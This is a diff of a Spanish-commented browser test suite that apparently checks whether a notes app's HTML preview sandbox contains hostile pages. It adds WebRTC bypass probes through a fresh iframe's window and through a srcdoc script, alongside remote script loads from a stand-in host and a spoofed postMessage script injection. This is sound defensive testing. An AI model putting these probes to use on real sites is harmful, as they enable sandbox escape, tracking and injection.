@@ -109,6 +109,10 @@ try { ['preconnect', 'dns-prefetch', 'prefetch', 'stylesheet'].forEach(function 
 try { var s = document.createElement('script'); s.src = FAR + '/remoto.js'; document.head.appendChild(s); } catch (e) { /* bloqueado */ }
 try { new Worker(URL.createObjectURL(new Blob(['fetch("' + FAR + '/worker")'], { type: 'text/javascript' }))); R.worker = 'creado'; } catch (e) { R.worker = 'blocked'; }
 try { var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:${STUN}' }] }); pc.createDataChannel('x'); pc.createOffer().then(function (o) { return pc.setLocalDescription(o); }).catch(function () {}); R.rtc = 'creado'; } catch (e) { R.rtc = 'blocked'; }
+// El rodeo: la de un marco vacío recién creado, que es otra ventana.
+try { var f2 = document.createElement('iframe'); document.body.appendChild(f2); var pc2 = new f2.contentWindow.RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:${STUN}' }] }); pc2.createDataChannel('x'); pc2.createOffer().then(function (o) { return pc2.setLocalDescription(o); }).catch(function () {}); R.rtc2 = 'creado'; } catch (e) { R.rtc2 = 'blocked'; }
+// Y el otro rodeo: un marco con su propio script escrito adentro, que corre en su propia ventana.
+try { var f3 = document.createElement('iframe'); f3.srcdoc = '<script>try { var p = new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:${STUN}" }] }); p.createDataChannel("x"); p.createOffer().then(function (o) { return p.setLocalDescription(o); }).catch(function () {}); } catch (e) {}<\\/script>'; document.body.appendChild(f3); } catch (e) { /* bloqueado */ }
 try { var fr = document.createElement('iframe'); fr.src = FAR + '/marco-js'; document.body.appendChild(fr); } catch (e) { /* bloqueado */ }
 // Hacerse pasar por htmlrun.html y por la app, a ver si la página de arriba hace algo con eso.
 try { parent.postMessage('lmd-run-ready', '*'); parent.postMessage({ lmdRun: '<script>parent.__pwn=9<\\/script>', type: 'lazyLoad', what: 'x' }, '*'); } catch (e) { /* bloqueado */ }
@@ -360,7 +364,7 @@ await step('preview', 'Vista previa: el marco, la política y los archivos de la
   check('estática: no corrió ningún script, ni el de la página ni el de la carpeta', d.ext === undefined && d.inline === undefined && !d.colado, [d.ext, d.inline]);
   check('los enlaces quedan sin destino: una página en blanco, en una pestaña nueva que el marco no puede abrir', d.base === '_blank' && J(d.targets) === J([['_blank', 'about:blank', ''], ['_blank', 'about:blank', 'sub/pagina.html'], ['_blank', 'about:blank', FAR + '/enlace']]), d.targets);
   const note = await page.evaluate(() => ({ text: document.querySelector('.lmd-cv-note').textContent, run: !!document.querySelector('.lmd-cv-note [data-cv=run]'), article: getComputedStyle(document.querySelector('.lmd-article')).display, w: document.querySelector('.lmd-cv-frame').getBoundingClientRect().width, bg: getComputedStyle(document.querySelector('.lmd-cv-frame')).backgroundColor }));
-  check('el cartel dice que es estática y ofrece correr los scripts, con lo que significa', /Static view: scripts do not run and nothing is requested from the internet\./.test(note.text) && note.run && /They run isolated: they cannot read your notes or your account, and they load nothing from the internet\. A page from someone else could still signal out that you opened it\. It applies to this file, until you close the tab\./.test(note.text) && note.article === 'none' && note.w > 800 && note.bg === 'rgb(255, 255, 255)', note);
+  check('el cartel dice que es estática y ofrece correr los scripts, con lo que significa', /Static view: scripts do not run and nothing is requested from the internet\./.test(note.text) && note.run && /They run isolated from your notes and your account, but someone else's page could signal out that you opened it\./.test(note.text) && await page.evaluate(() => document.querySelectorAll('.lmd-cv-note .lmd-cv-fine').length === 1) && note.article === 'none' && note.w > 800 && note.bg === 'rgb(255, 255, 255)', note);
   // Los enlaces no llevan a ningún lado.
   const pages0 = ctx.pages().length; const url0 = page.url();
   for (const id of ['frag', 'otro', 'ext']) { await f.click('#' + id, { timeout: 3000 }).catch(() => {}); await sleep(250); }
@@ -462,6 +466,7 @@ await step('scripts', 'El mismo HTML hostil, con sus scripts habilitados', async
   check('no tiene almacenamiento propio ni cookies, ni ve a la extensión', R.ls === 'blocked' && R.cookie === 'blocked' && R.idb !== 'ok' && R.ext === false, R);
   check('no navega la pestaña, no abre ventanas, no evalúa texto como código, no muestra diálogos', R.top === 'blocked' && R.open !== 'ABRIO' && R.eval === 'blocked' && dialogs.length === 0, [R.top, R.open, R.eval, dialogs]);
   check('fetch no sale', R.fetch === 'blocked', R.fetch);
+  check('WebRTC no está en la ventana de la página', R.rtc === 'blocked' && await fh.evaluate(() => typeof RTCPeerConnection === 'undefined' && typeof webkitRTCPeerConnection === 'undefined'), R.rtc);
   await sleep(2500); // el meta refresh, el formulario, los pedidos sueltos, WebRTC
   const fr = await frameOf(page);
   for (const id of ['top', 'ext', 'rel', 'self', 'enviar']) { await fr.click('#' + id, { timeout: 3000 }).catch(() => {}); await sleep(200); }
@@ -473,7 +478,7 @@ await step('scripts', 'El mismo HTML hostil, con sus scripts habilitados', async
   // Lo que una política de contenido no cierra en este navegador, medido: conexiones que se abren sin llegar a pedir
   // nada (un <link rel=preconnect>, un marco que intenta navegar) y paquetes de WebRTC. Con eso una página puede avisar
   // que la abrieron; de la app no puede sacar nada. Es el motivo por el que los scripts no corren de fábrica.
-  console.log('    con scripts, sin pedidos HTTP; lo que la política no cubre: ' + l.conns + ' conexiones sin pedido y ' + l.udp + ' paquetes de WebRTC');
+  console.log('    con scripts, sin pedidos HTTP; lo que la política no cubre: ' + l.conns + ' conexiones sin pedido y ' + l.udp + ' paquetes de WebRTC (directo: ' + R.rtc + '; por un marco vacío: ' + R.rtc2 + '; los paquetes que haya son del marco con script propio)');
   await shot(page, 'hostil-con-scripts');
   // El que se va solo, con scripts: la política de la app no deja que el marco cargue otro sitio.
   reset(); await openFile(page, 'seva.html'); await preview(page, '#aca'); await page.click('.lmd-cv-note [data-cv=run]'); await sleep(2000);
